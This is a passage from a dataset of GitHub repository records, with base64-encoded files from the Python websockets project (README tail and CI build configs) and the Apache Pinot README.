dGhlIGV4YWN0IGRlcGVuZGVuY2llcyB5b3UgdXNlLiA8YSBocmVmPSJodHRw
czovL3RpZGVsaWZ0LmNvbS9zdWJzY3JpcHRpb24vcGtnL3B5cGktd2Vic29j
a2V0cz91dG1fc291cmNlPXB5cGktd2Vic29ja2V0cyZ1dG1fbWVkaXVtPXJl
ZmVycmFsJnV0bV9jYW1wYWlnbj1yZWFkbWUiPkxlYXJuIG1vcmUuPC9hPjwv
aT48L3A+CiAgICA8aHI+CiAgICA8cD4oSWYgeW91IGNvbnRyaWJ1dGUgdG8g
PGNvZGU+d2Vic29ja2V0czwvY29kZT4gYW5kIHdvdWxkIGxpa2UgdG8gYmVj
b21lIGFuIG9mZmljaWFsIHN1cHBvcnQgcHJvdmlkZXIsIDxhIGhyZWY9Imh0
dHBzOi8vZnJhY3RhbGlkZWFzLmNvbS8iPmxldCBtZSBrbm93PC9hPi4pPC9w
PgoKV2h5IHNob3VsZCBJIHVzZSBgYHdlYnNvY2tldHNgYD8KLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KClRoZSBkZXZlbG9wbWVudCBvZiBg
YHdlYnNvY2tldHNgYCBpcyBzaGFwZWQgYnkgZm91ciBwcmluY2lwbGVzOgoK
MS4gKipTaW1wbGljaXR5Kio6IGFsbCB5b3UgbmVlZCB0byB1bmRlcnN0YW5k
IGlzIGBgbXNnID0gYXdhaXQgd3MucmVjdigpYGAgYW5kCiAgIGBgYXdhaXQg
d3Muc2VuZChtc2cpYGA7IGBgd2Vic29ja2V0c2BgIHRha2VzIGNhcmUgb2Yg
bWFuYWdpbmcgY29ubmVjdGlvbnMKICAgc28geW91IGNhbiBmb2N1cyBvbiB5
b3VyIGFwcGxpY2F0aW9uLgoKMi4gKipSb2J1c3RuZXNzKio6IGBgd2Vic29j
a2V0c2BgIGlzIGJ1aWx0IGZvciBwcm9kdWN0aW9uOyBmb3IgZXhhbXBsZSBp
dCB3YXMKICAgdGhlIG9ubHkgbGlicmFyeSB0byBgaGFuZGxlIGJhY2twcmVz
c3VyZSBjb3JyZWN0bHlgXyBiZWZvcmUgdGhlIGlzc3VlCiAgIGJlY2FtZSB3
aWRlbHkga25vd24gaW4gdGhlIFB5dGhvbiBjb21tdW5pdHkuCgozLiAqKlF1
YWxpdHkqKjogYGB3ZWJzb2NrZXRzYGAgaXMgaGVhdmlseSB0ZXN0ZWQuIENv
bnRpbnVvdXMgaW50ZWdyYXRpb24gZmFpbHMKICAgdW5kZXIgMTAwJSBicmFu
Y2ggY292ZXJhZ2UuIEFsc28gaXQgcGFzc2VzIHRoZSBpbmR1c3RyeS1zdGFu
ZGFyZCBgQXV0b2JhaG4KICAgVGVzdHN1aXRlYF8uCgo0LiAqKlBlcmZvcm1h
bmNlKio6IG1lbW9yeSB1c2UgaXMgY29uZmlndXJhYmxlLiBBbiBleHRlbnNp
b24gd3JpdHRlbiBpbiBDCiAgIGFjY2VsZXJhdGVzIGV4cGVuc2l2ZSBvcGVy
YXRpb25zLiBJdCdzIHByZS1jb21waWxlZCBmb3IgTGludXgsIG1hY09TIGFu
ZAogICBXaW5kb3dzIGFuZCBwYWNrYWdlZCBpbiB0aGUgd2hlZWwgZm9ybWF0
IGZvciBlYWNoIHN5c3RlbSBhbmQgUHl0aG9uIHZlcnNpb24uCgpEb2N1bWVu
dGF0aW9uIGlzIGEgZmlyc3QgY2xhc3MgY29uY2VybiBpbiB0aGUgcHJvamVj
dC4gSGVhZCBvdmVyIHRvIGBSZWFkIHRoZQpEb2NzYF8gYW5kIHNlZSBmb3Ig
eW91cnNlbGYuCgouLiBfUmVhZCB0aGUgRG9jczogaHR0cHM6Ly93ZWJzb2Nr
ZXRzLnJlYWR0aGVkb2NzLmlvLwouLiBfaGFuZGxlIGJhY2twcmVzc3VyZSBj
b3JyZWN0bHk6IGh0dHBzOi8vdm9ycHVzLm9yZy9ibG9nL3NvbWUtdGhvdWdo
dHMtb24tYXN5bmNocm9ub3VzLWFwaS1kZXNpZ24taW4tYS1wb3N0LWFzeW5j
YXdhaXQtd29ybGQvI3dlYnNvY2tldC1zZXJ2ZXJzCi4uIF9BdXRvYmFobiBU
ZXN0c3VpdGU6IGh0dHBzOi8vZ2l0aHViLmNvbS9hYXVndXN0aW4vd2Vic29j
a2V0cy9ibG9iL21hc3Rlci9jb21wbGlhbmNlL1JFQURNRS5yc3QKCldoeSBz
aG91bGRuJ3QgSSB1c2UgYGB3ZWJzb2NrZXRzYGA/Ci0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tCgoqIElmIHlvdSBwcmVmZXIgY2FsbGJh
Y2tzIG92ZXIgY29yb3V0aW5lczogYGB3ZWJzb2NrZXRzYGAgd2FzIGNyZWF0
ZWQgdG8KICBwcm92aWRlIHRoZSBiZXN0IGNvcm91dGluZS1iYXNlZCBBUEkg
dG8gbWFuYWdlIFdlYlNvY2tldCBjb25uZWN0aW9ucyBpbgogIFB5dGhvbi4g
UGljayBhbm90aGVyIGxpYnJhcnkgZm9yIGEgY2FsbGJhY2stYmFzZWQgQVBJ
LgoqIElmIHlvdSdyZSBsb29raW5nIGZvciBhIG1peGVkIEhUVFAgLyBXZWJT
b2NrZXQgbGlicmFyeTogYGB3ZWJzb2NrZXRzYGAgYWltcwogIGF0IGJlaW5n
IGFuIGV4Y2VsbGVudCBpbXBsZW1lbnRhdGlvbiBvZiA6cmZjOmA2NDU1YDog
VGhlIFdlYlNvY2tldCBQcm90b2NvbAogIGFuZCA6cmZjOmA3NjkyYDogQ29t
cHJlc3Npb24gRXh0ZW5zaW9ucyBmb3IgV2ViU29ja2V0LiBJdHMgc3VwcG9y
dCBmb3IgSFRUUAogIGlzIG1pbmltYWwg4oCUIGp1c3QgZW5vdWdoIGZvciBh
IEhUVFAgaGVhbHRoIGNoZWNrLgoqIElmIHlvdSB3YW50IHRvIHVzZSBQeXRo
b24gMjogYGB3ZWJzb2NrZXRzYGAgYnVpbGRzIHVwb24gYGBhc3luY2lvYGAg
d2hpY2gKICBvbmx5IHdvcmtzIG9uIFB5dGhvbiAzLiBgYHdlYnNvY2tldHNg
YCByZXF1aXJlcyBQeXRob24g4omlIDMuNi4xLgoKV2hhdCBlbHNlPwotLS0t
LS0tLS0tCgpCdWcgcmVwb3J0cywgcGF0Y2hlcyBhbmQgc3VnZ2VzdGlvbnMg
YXJlIHdlbGNvbWUhCgpUbyByZXBvcnQgYSBzZWN1cml0eSB2dWxuZXJhYmls
aXR5LCBwbGVhc2UgdXNlIHRoZSBgVGlkZWxpZnQgc2VjdXJpdHkKY29udGFj
dGBfLiBUaWRlbGlmdCB3aWxsIGNvb3JkaW5hdGUgdGhlIGZpeCBhbmQgZGlz
Y2xvc3VyZS4KCi4uIF9UaWRlbGlmdCBzZWN1cml0eSBjb250YWN0OiBodHRw
czovL3RpZGVsaWZ0LmNvbS9zZWN1cml0eQoKRm9yIGFueXRoaW5nIGVsc2Us
IHBsZWFzZSBvcGVuIGFuIGlzc3VlXyBvciBzZW5kIGEgYHB1bGwgcmVxdWVz
dGBfLgoKLi4gX2lzc3VlOiBodHRwczovL2dpdGh1Yi5jb20vYWF1Z3VzdGlu
L3dlYnNvY2tldHMvaXNzdWVzL25ldwouLiBfcHVsbCByZXF1ZXN0OiBodHRw
czovL2dpdGh1Yi5jb20vYWF1Z3VzdGluL3dlYnNvY2tldHMvY29tcGFyZS8K
ClBhcnRpY2lwYW50cyBtdXN0IHVwaG9sZCB0aGUgYENvbnRyaWJ1dG9yIENv
dmVuYW50IGNvZGUgb2YgY29uZHVjdGBfLgoKLi4gX0NvbnRyaWJ1dG9yIENv
dmVuYW50IGNvZGUgb2YgY29uZHVjdDogaHR0cHM6Ly9naXRodWIuY29tL2Fh
dWd1c3Rpbi93ZWJzb2NrZXRzL2Jsb2IvbWFzdGVyL0NPREVfT0ZfQ09ORFVD
VC5tZAoKYGB3ZWJzb2NrZXRzYGAgaXMgcmVsZWFzZWQgdW5kZXIgdGhlIGBC
U0QgbGljZW5zZWBfLgoKLi4gX0JTRCBsaWNlbnNlOiBodHRwczovL2dpdGh1
Yi5jb20vYWF1Z3VzdGluL3dlYnNvY2tldHMvYmxvYi9tYXN0ZXIvTElDRU5T
RQo=
",,"ZW52OgogIGdsb2JhbDoKICAjIHdlYnNvY2tldHMgb25seSB3b3JrcyBvbiBQ
eXRob24gPj0gMy42LgogICAgLSBDSUJXX1NLSVA9ImNwMjctKiBjcDMzLSog
Y3AzNC0qIGNwMzUtKiIKICAgIC0gQ0lCV19URVNUX0NPTU1BTkQ9InB5dGhv
bjMgLVcgZGVmYXVsdCAtbSB1bml0dGVzdCIKICAgIC0gV0VCU09DS0VUU19U
RVNUU19USU1FT1VUX0ZBQ1RPUj0xMDAKCm1hdHJpeDoKICBpbmNsdWRlOgog
ICAgLSBsYW5ndWFnZTogcHl0aG9uCiAgICAgIGRpc3Q6IHhlbmlhbCAgICAj
IHJlcXVpcmVkIGZvciBQeXRob24gMy43ICh0cmF2aXMtY2kvdHJhdmlzLWNp
IzkwNjkpCiAgICAgIHN1ZG86IHJlcXVpcmVkCiAgICAgIHB5dGhvbjogIjMu
NyIKICAgICAgc2VydmljZXM6CiAgICAgICAgLSBkb2NrZXIKICAgIC0gb3M6
IG9zeAogICAgICBvc3hfaW1hZ2U6IHhjb2RlOC4zCgppbnN0YWxsOgojIFB5
dGhvbiAzIGlzIG5lZWRlZCB0byBydW4gY2lidWlsZHdoZWVsIGZvciB3ZWJz
b2NrZXRzLgogIC0gaWYgWyAiJHtUUkFWSVNfT1NfTkFNRTotfSIgPT0gIm9z
eCIgXTsgdGhlbgogICAgICBicmV3IHVwZGF0ZTsKICAgICAgYnJldyB1cGdy
YWRlIHB5dGhvbjsKICAgIGZpCiMgSW5zdGFsbCBjaWJ1aWxkd2hlZWwgdXNp
bmcgcGlwMyB0byBtYWtlIHN1cmUgUHl0aG9uIDMgaXMgdXNlZC4KICAtIHBp
cDMgaW5zdGFsbCAtLXVwZ3JhZGUgY2lidWlsZHdoZWVsCiMgQ3JlYXRlIGZp
bGUgJy5jaWJ1aWxkd2hlZWwnIHNvIHRoYXQgZXh0ZW5zaW9uIGJ1aWxkIGlz
IG5vdCBvcHRpb25hbCAoYy5mLiBzZXR1cC5weSkuCiAgLSB0b3VjaCAuY2li
dWlsZHdoZWVsCgpzY3JpcHQ6CiAgLSBjaWJ1aWxkd2hlZWwgLS1vdXRwdXQt
ZGlyIHdoZWVsaG91c2UKIyBVcGxvYWQgdG8gUHlQSSBvbiB0YWdzCiAgLSBp
ZiBbICIke1RSQVZJU19UQUc6LX0iICE9ICIiIF07IHRoZW4KICAgICAgcGlw
MyBpbnN0YWxsIHR3aW5lOwogICAgICBweXRob24zIC1tIHR3aW5lIHVwbG9h
ZCAtLXNraXAtZXhpc3Rpbmcgd2hlZWxob3VzZS8qOwogICAgZmkK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"dmVyc2lvbjogMgoKam9iczoKICBtYWluOgogICAgZG9ja2VyOgogICAgICAt
IGltYWdlOiBjaXJjbGVjaS9weXRob246My43CiAgICBzdGVwczoKICAgICAg
IyBSZW1vdmUgSVB2NiBlbnRyeSBmb3IgbG9jYWxob3N0IGluIENpcmNsZSBD
SSBjb250YWluZXJzIGJlY2F1c2UgaXQgZG9lc24ndCB3b3JrIGFueXdheS4K
ICAgICAgLSBydW46IHN1ZG8gY3AgL2V0Yy9ob3N0cyAvdG1wOyBzdWRvIHNl
ZCAtaSAnLzo6MS9kJyAvdG1wL2hvc3RzOyBzdWRvIGNwIC90bXAvaG9zdHMg
L2V0YwogICAgICAtIGNoZWNrb3V0CiAgICAgIC0gcnVuOiBzdWRvIHBpcCBp
bnN0YWxsIHRveCBjb2RlY292CiAgICAgIC0gcnVuOiB0b3ggLWUgY292ZXJh
Z2UsYmxhY2ssZmxha2U4LGlzb3J0LG15cHkKICAgICAgLSBydW46IGNvZGVj
b3YKICBweTM2OgogICAgZG9ja2VyOgogICAgICAtIGltYWdlOiBjaXJjbGVj
aS9weXRob246My42CiAgICBzdGVwczoKICAgICAgIyBSZW1vdmUgSVB2NiBl
bnRyeSBmb3IgbG9jYWxob3N0IGluIENpcmNsZSBDSSBjb250YWluZXJzIGJl
Y2F1c2UgaXQgZG9lc24ndCB3b3JrIGFueXdheS4KICAgICAgLSBydW46IHN1
ZG8gY3AgL2V0Yy9ob3N0cyAvdG1wOyBzdWRvIHNlZCAtaSAnLzo6MS9kJyAv
dG1wL2hvc3RzOyBzdWRvIGNwIC90bXAvaG9zdHMgL2V0YwogICAgICAtIGNo
ZWNrb3V0CiAgICAgIC0gcnVuOiBzdWRvIHBpcCBpbnN0YWxsIHRveAogICAg
ICAtIHJ1bjogdG94IC1lIHB5MzYKICBweTM3OgogICAgZG9ja2VyOgogICAg
ICAtIGltYWdlOiBjaXJjbGVjaS9weXRob246My43CiAgICBzdGVwczoKICAg
ICAgIyBSZW1vdmUgSVB2NiBlbnRyeSBmb3IgbG9jYWxob3N0IGluIENpcmNs
ZSBDSSBjb250YWluZXJzIGJlY2F1c2UgaXQgZG9lc24ndCB3b3JrIGFueXdh
eS4KICAgICAgLSBydW46IHN1ZG8gY3AgL2V0Yy9ob3N0cyAvdG1wOyBzdWRv
IHNlZCAtaSAnLzo6MS9kJyAvdG1wL2hvc3RzOyBzdWRvIGNwIC90bXAvaG9z
dHMgL2V0YwogICAgICAtIGNoZWNrb3V0CiAgICAgIC0gcnVuOiBzdWRvIHBp
cCBpbnN0YWxsIHRveAogICAgICAtIHJ1bjogdG94IC1lIHB5MzcKICBweTM4
OgogICAgZG9ja2VyOgogICAgICAtIGltYWdlOiBjaXJjbGVjaS9weXRob246
My44LjByYzEKICAgIHN0ZXBzOgogICAgICAjIFJlbW92ZSBJUHY2IGVudHJ5
IGZvciBsb2NhbGhvc3QgaW4gQ2lyY2xlIENJIGNvbnRhaW5lcnMgYmVjYXVz
ZSBpdCBkb2Vzbid0IHdvcmsgYW55d2F5LgogICAgICAtIHJ1bjogc3VkbyBj
cCAvZXRjL2hvc3RzIC90bXA7IHN1ZG8gc2VkIC1pICcvOjoxL2QnIC90bXAv
aG9zdHM7IHN1ZG8gY3AgL3RtcC9ob3N0cyAvZXRjCiAgICAgIC0gY2hlY2tv
dXQKICAgICAgLSBydW46IHN1ZG8gcGlwIGluc3RhbGwgdG94CiAgICAgIC0g
cnVuOiB0b3ggLWUgcHkzOAoKd29ya2Zsb3dzOgogIHZlcnNpb246IDIKICBi
dWlsZDoKICAgIGpvYnM6CiAgICAgIC0gbWFpbgogICAgICAtIHB5MzY6CiAg
ICAgICAgICByZXF1aXJlczoKICAgICAgICAgICAgLSBtYWluCiAgICAgIC0g
cHkzNzoKICAgICAgICAgIHJlcXVpcmVzOgogICAgICAgICAgICAtIG1haW4K
ICAgICAgLSBweTM4OgogICAgICAgICAgcmVxdWlyZXM6CiAgICAgICAgICAg
IC0gbWFpbgo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'incubator-pinot',19961085,b'Apache Pinot (Incubating) - A realtime distributed OLAP datastore',b'Java',317,2395,,2395,False,b'https://api.github.com/repos/apache/incubator-pinot/forks',"PCEtLQoKICAgIExpY2Vuc2VkIHRvIHRoZSBBcGFjaGUgU29mdHdhcmUgRm91
bmRhdGlvbiAoQVNGKSB1bmRlciBvbmUKICAgIG9yIG1vcmUgY29udHJpYnV0
b3IgbGljZW5zZSBhZ3JlZW1lbnRzLiAgU2VlIHRoZSBOT1RJQ0UgZmlsZQog
ICAgZGlzdHJpYnV0ZWQgd2l0aCB0aGlzIHdvcmsgZm9yIGFkZGl0aW9uYWwg
aW5mb3JtYXRpb24KICAgIHJlZ2FyZGluZyBjb3B5cmlnaHQgb3duZXJzaGlw
LiAgVGhlIEFTRiBsaWNlbnNlcyB0aGlzIGZpbGUKICAgIHRvIHlvdSB1bmRl
ciB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb24gMi4wICh0aGUKICAgICJM
aWNlbnNlIik7IHlvdSBtYXkgbm90IHVzZSB0aGlzIGZpbGUgZXhjZXB0IGlu
IGNvbXBsaWFuY2UKICAgIHdpdGggdGhlIExpY2Vuc2UuICBZb3UgbWF5IG9i
dGFpbiBhIGNvcHkgb2YgdGhlIExpY2Vuc2UgYXQKCiAgICAgIGh0dHA6Ly93
d3cuYXBhY2hlLm9yZy9saWNlbnNlcy9MSUNFTlNFLTIuMAoKICAgIFVubGVz
cyByZXF1aXJlZCBieSBhcHBsaWNhYmxlIGxhdyBvciBhZ3JlZWQgdG8gaW4g
d3JpdGluZywKICAgIHNvZnR3YXJlIGRpc3RyaWJ1dGVkIHVuZGVyIHRoZSBM
aWNlbnNlIGlzIGRpc3RyaWJ1dGVkIG9uIGFuCiAgICAiQVMgSVMiIEJBU0lT
LCBXSVRIT1VUIFdBUlJBTlRJRVMgT1IgQ09ORElUSU9OUyBPRiBBTlkKICAg
IEtJTkQsIGVpdGhlciBleHByZXNzIG9yIGltcGxpZWQuICBTZWUgdGhlIExp
Y2Vuc2UgZm9yIHRoZQogICAgc3BlY2lmaWMgbGFuZ3VhZ2UgZ292ZXJuaW5n
IHBlcm1pc3Npb25zIGFuZCBsaW1pdGF0aW9ucwogICAgdW5kZXIgdGhlIExp
Y2Vuc2UuCgotLT4KIyBBcGFjaGUgUGlub3QgKGluY3ViYXRpbmcpCgpbIVtC
dWlsZCBTdGF0dXNdKGh0dHBzOi8vYXBpLnRyYXZpcy1jaS5vcmcvYXBhY2hl
L2luY3ViYXRvci1waW5vdC5zdmc/YnJhbmNoPW1hc3RlcildKGh0dHBzOi8v
dHJhdmlzLWNpLm9yZy9hcGFjaGUvaW5jdWJhdG9yLXBpbm90KSBbIVtjb2Rl
Y292LmlvXShodHRwczovL2NvZGVjb3YuaW8vZ2l0aHViL2FwYWNoZS9pbmN1
YmF0b3ItcGlub3QvYnJhbmNoL21hc3Rlci9ncmFwaC9iYWRnZS5zdmcpXSho
dHRwczovL2NvZGVjb3YuaW8vZ2l0aHViL2FwYWNoZS9pbmN1YmF0b3ItcGlu
b3QpIFshW0pvaW4gdGhlIGNoYXQgYXQgaHR0cHM6Ly9naXR0ZXIuaW0vbGlu
a2VkaW4vcGlub3RdKGh0dHBzOi8vYmFkZ2VzLmdpdHRlci5pbS9Kb2luJTIw
Q2hhdC5zdmcpXShodHRwczovL2dpdHRlci5pbS9saW5rZWRpbi9waW5vdD91
dG1fc291cmNlPWJhZGdlJnV0bV9tZWRpdW09YmFkZ2UmdXRtX2NhbXBhaWdu
PXByLWJhZGdlJnV0bV9jb250ZW50PWJhZGdlKSBbIVtsaWNlbnNlXShodHRw
czovL2ltZy5zaGllbGRzLmlvL2dpdGh1Yi9saWNlbnNlL2FwYWNoZS9waW5v
dC5zdmcpXShMSUNFTlNFKQoKQXBhY2hlIFBpbm90IGlzIGEgcmVhbHRpbWUg
ZGlzdHJpYnV0ZWQgT0xBUCBkYXRhc3RvcmUsIHdoaWNoIGlzIHVzZWQgdG8g
ZGVsaXZlciBzY2FsYWJsZSByZWFsIHRpbWUgYW5hbHl0aWNzIHdpdGggbG93
IGxhdGVuY3kuIEl0IGNhbiBpbmdlc3QgZGF0YSBmcm9tIG9mZmxpbmUgZGF0
YSBzb3VyY2VzIChzdWNoIGFzIEhhZG9vcCBhbmQgZmxhdCBmaWxlcykgYXMg
d2VsbCBhcyBvbmxpbmUgc291cmNlcyAoc3VjaCBhcyBLYWZrYSkuIFBpbm90
IGlzIGRlc2lnbmVkIHRvIHNjYWxlIGhvcml6b250YWxseS4KClRoZXNlIHBy
ZXNlbnRhdGlvbnMgb24gUGlub3QgZ2l2ZSBhbiBvdmVydmlldyBvZiBQaW5v
dDoKCiogW1Bpbm90OiBFbmFibGluZyBSZWFsLXRpbWUgQW5hbHl0aWNzIEFw
cGxpY2F0aW9ucyBAIExpbmtlZEluJ3MgU2NhbGUgIC0gQXBhY2hlQ29uIDIw
MTkgKFNlcCAyMDE5KV0oaHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvc2V1
bmdoeXVubGVlMTQ2MC9waW5vdC1lbmFibGluZy1yZWFsdGltZS1hbmFseXRp
Y3MtYXBwbGljYXRpb25zLWxpbmtlZGlucy1zY2FsZSkKKiBbUGlub3Q6IFJl
YWx0aW1lIE9MQVAgZm9yIDUzMCBNaWxsaW9uIFVzZXJzIC0gU2lnbW9kIDIw
MTggKEp1biAyMDE4KV0oaHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC9zZXVu
Z2h5dW5sZWUxNDYwL3Bpbm90LXJlYWx0aW1lLW9sYXAtZm9yLTUzMC1taWxs
aW9uLXVzZXJzLXNpZ21vZC0yMDE4LTEwNzM5NDU4NCkKKiBbT3BlbiBTb3Vy
Y2UgQW5hbHl0aWNzIFBpcGVsaW5lIGF0IExpbmtlZEluIChTZXAgMjAxNiwg
Y292ZXJzIEdvYmJsaW4gYW5kIFBpbm90KV0oaHR0cDovL3d3dy5zbGlkZXNo
YXJlLm5ldC9Jc3NhY0J1ZW5yb3N0cm8vb3Blbi1zb3VyY2UtbGlua2VkaW4t
YW5hbHl0aWNzLXBpcGVsaW5lLXZsZGItMjAxNikKKiBbSW50cm9kdWN0aW9u
IHRvIFBpbm90IChKYW4gMjAxNildKGh0dHA6Ly93d3cuc2xpZGVzaGFyZS5u
ZXQvamVhbmZyYW5jb2lzaW0vaW50cm8tdG8tcGlub3QtMjAxNjAxMDQpCiog
W1Bpbm90OiBSZWFsdGltZSBEaXN0cmlidXRlZCBPTEFQIERhdGFzdG9yZSAo
QXVnIDIwMTUpXShodHRwOi8vd3d3LnNsaWRlc2hhcmUubmV0L0tpc2hvcmVH
b3BhbGFrcmlzaG5hL3Bpbm90LXJlYWx0aW1lLWRpc3RyaWJ1dGVkLW9sYXAt
ZGF0YXN0b3JlKQoKTG9va2luZyBmb3IgdGhlIFRoaXJkRXllIGFub21hbHkg
ZGV0ZWN0aW9uIGFuZCByb290LWNhdXNlIGFuYWx5c2lzIHBsYXRmb3JtPyBD
aGVjayBvdXQgdGhlIFtQaW5vdC9UaGlyZEV5ZSBwcm9qZWN0XShodHRwczov
L2dpdGh1Yi5jb20vYXBhY2hlL2luY3ViYXRvci1waW5vdC90cmVlL21hc3Rl
ci90aGlyZGV5ZSkKCiMjIEtleSBGZWF0dXJlcwoKLSBBIGNvbHVtbi1vcmll
bnRlZCBkYXRhYmFzZSB3aXRoIHZhcmlvdXMgY29tcHJlc3Npb24gc2NoZW1l
cyBzdWNoIGFzIFJ1biBMZW5ndGgsIEZpeGVkIEJpdCBMZW5ndGgKLSBQbHVn
Z2FibGUgaW5kZXhpbmcgdGVjaG5vbG9naWVzIC0gU29ydGVkIEluZGV4LCBC
aXRtYXAgSW5kZXgsIEludmVydGVkIEluZGV4LCBTdGFyLVRyZWUgSW5kZXgK
LSBBYmlsaXR5IHRvIG9wdGltaXplIHF1ZXJ5L2V4ZWN1dGlvbiBwbGFuIGJh
c2VkIG9uIHF1ZXJ5IGFuZCBzZWdtZW50IG1ldGFkYXRhCi0gTmVhciByZWFs
IHRpbWUgaW5nZXN0aW9uIGZyb20gS2Fma2EgYW5kIGJhdGNoIGluZ2VzdGlv
biBmcm9tIEhhZG9vcAotIFNRTCBsaWtlIGxhbmd1YWdlIHRoYXQgc3VwcG9y
dHMgX3NlbGVjdGlvbiwgYWdncmVnYXRpb24sIGZpbHRlcmluZywgZ3JvdXAg
YnksIG9yZGVyIGJ5LCBkaXN0aW5jdF8gcXVlcmllcyBvbiBmYWN0IGRhdGEK
LSBTdXBwb3J0IGZvciBtdWx0aXZhbHVlZCBmaWVsZHMKLSBIb3Jpem9udGFs
bHkgc2NhbGFibGUgYW5kIGZhdWx0IHRvbGVyYW50IAoKQmVjYXVzZSBvZiB0
aGUgZGVzaWduIGNob2ljZXMgd2UgbWFkZSB0byBhY2hpZXZlIHRoZXNlIGdv
YWxzLCB0aGVyZSBhcmUgY2VydGFpbiBsaW1pdGF0aW9ucyBwcmVzZW50IGlu
IFBpbm90OgoKLSBQaW5vdCBpcyBub3QgYSByZXBsYWNlbWVudCBmb3IgZGF0
YWJhc2UgaS5lIGl0IGNhbm5vdCBiZSB1c2VkIGFzIHNvdXJjZSBvZiB0cnV0
aCBzdG9yZSwgY2Fubm90IG11dGF0ZSBkYXRhIAotIE5vdCBhIHJlcGxhY2Vt
ZW50IGZvciBzZWFyY2ggZW5naW5lIGkuZSBmdWxsIHRleHQgc2VhcmNoLCBy
ZWxldmFuY2Ugbm90IHN1cHBvcnRlZAotIFF1ZXJ5IGNhbm5vdCBzcGFuIGFj
cm9zcyBtdWx0aXBsZSB0YWJsZXMKClBpbm90IHdvcmtzIHZlcnkgd2VsbCBm
b3IgcXVlcnlpbmcgdGltZSBzZXJpZXMgZGF0YSB3aXRoIGxvdHMgb2YgRGlt
ZW5zaW9ucyBhbmQgTWV0cmljcy4gRXhhbXBsZSAtIFF1ZXJ5IChwcm9maWxl
IHZpZXdzLCBhZCBjYW1wYWlnbiBwZXJmb3JtYW5jZSwgZXRjLikgaW4gYW4g
YW5hbHl0aWNhbCBmYXNoaW9uICh3aG8gdmlld2VkIHRoaXMgcHJvZmlsZSBp
biB0aGUgbGFzdCB3ZWVrcywgaG93IG1hbnkgYWRzIHdlcmUgY2xpY2tlZCBw
ZXIgY2FtcGFpZ24pLiAKCiMjIEluc3RydWN0aW9ucyB0byBidWlsZCBQaW5v
dApNb3JlIGRldGFpbGVkIGluc3RydWN0aW9ucyBjYW4gYmUgZm91bmQgYXQg
W1F1aWNrIERlbW9dKGh0dHBzOi8vcGlub3QucmVhZHRoZWRvY3MuaW8vZW4v
bGF0ZXN0L2dldHRpbmdfc3RhcnRlZC5odG1sKSBzZWN0aW9uIGluIHRoZSBk
b2N1bWVudGF0aW9uLgpgYGAKIyBDbG9uZSBhIHJlcG8KJCBnaXQgY2xvbmUg
aHR0cHM6Ly9naXRodWIuY29tL2FwYWNoZS9pbmN1YmF0b3ItcGlub3QuZ2l0
CiQgY2QgaW5jdWJhdG9yLXBpbm90CgojIEJ1aWxkIFBpbm90CiQgbXZuIGNs
ZWFuIGluc3RhbGwgLURza2lwVGVzdHMgLVBiaW4tZGlzdAoKIyBSdW4gdGhl
IFF1aWNrIERlbW8KJCBjZCBwaW5vdC1kaXN0cmlidXRpb24vdGFyZ2V0L2Fw
YWNoZS1waW5vdC1pbmN1YmF0aW5nLTx2ZXJzaW9uPi1TTkFQU0hPVC1iaW4K
JCBiaW4vcXVpY2stc3RhcnQtb2ZmbGluZS5zaApgYGAKCiMjIERlcGxveSBQ
aW5vdCBvbiBLdWJlcm5ldGVzClBsZWFzZSByZWZlciB0byBbS3ViZXJuZXRl
cyBSZWFkbWVdKGt1YmVybmV0ZXMvaGVsbS9SRUFETUUubWQpIHRvIGRlcGxv
eSBQaW5vdCB1c2luZyBbSGVsbV0oPGh0dHBzOi8vaGVsbS5zaC9kb2NzL3Vz
aW5nX2hlbG0vI2luc3RhbGxpbmctaGVsbT4gYW5kIGxvYWQgZGVtbyBkYXRh
IHNldC4KClBpbm90IGFsc28gcHJvdmlkZXMgazhzIGludGVncmF0aW9uIHdp
dGggaW50ZXJhY3RpdmUgcXVlcnkgZW5naW5lIFtQcmVzdG9dKGt1YmVybmV0
ZXMvaGVsbS9wcmVzdG8tY29vcmRpbmF0b3IueWFtbCkgYW5kIGRhdGEgdmlz
dWFsaXphdGlvbiB0b29sIFtBcGFjaGUgU3VwZXJzZXRdKGt1YmVybmV0ZXMv
aGVsbS9zdXBlcnNldC55YW1sKS4KCiMjIEdldHRpbmcgSW52b2x2ZWQKIC0g
QXNrIHF1ZXN0aW9ucyBvbiBbQXBhY2hlIFBpbm90IFNsYWNrXShodHRwczov
L2NvbW11bml0eWludml0ZXIuY29tL2FwcHMvYXBhY2hlLXBpbm90L2FwYWNo
ZS1waW5vdCkKIC0gUGxlYXNlIGpvaW4gQXBhY2hlIFBpbm90IG1haWxpbmcg
bGlzdHMgIAogICBkZXYtc3Vic2NyaWJlQHBpbm90LmFwYWNoZS5vcmcgKHN1
YnNjcmliZSB0byBwaW5vdC1kZXYgbWFpbGluZyBsaXN0KSAgCiAgIGRldkBw
aW5vdC5hcGFjaGUub3JnIChwb3N0aW5nIHRvIHBpbm90LWRldiBtYWlsaW5n
IGxpc3QpICAKICAgdXNlcnMtc3Vic2NyaWJlQHBpbm90LmFwYWNoZS5vcmcg
KHN1YnNjcmliZSB0byBwaW5vdC11c2VyIG1haWxpbmcgbGlzdCkgIAogICB1
c2Vyc0BwaW5vdC5hcGFjaGUub3JnIChwb3NpdG5nIHRvIHBpbm90LXVzZXIg
bWFpbGluZyBsaXN0KQoKIyMgRG9jdW1lbnRhdGlvbgpDaGVjayBvdXQgW1Bp
bm90IGRvY3VtZW50YXRpb25dKGh0dHBzOi8vcGlub3QucmVhZHRoZWRvY3Mu
aW8pIGZvciBhIGNvbXBsZXRlIGRlc2NyaXB0aW9uIG9mIFBpbm90J3MgZmVh
dHVyZXMuCi0gW1F1aWNrIERlbW9dKGh0dHBzOi8vcGlub3QucmVhZHRoZWRv
Y3MuaW8vZW4vbGF0ZXN0L2dldHRpbmdfc3RhcnRlZC5odG1sKQotIFtQaW5v
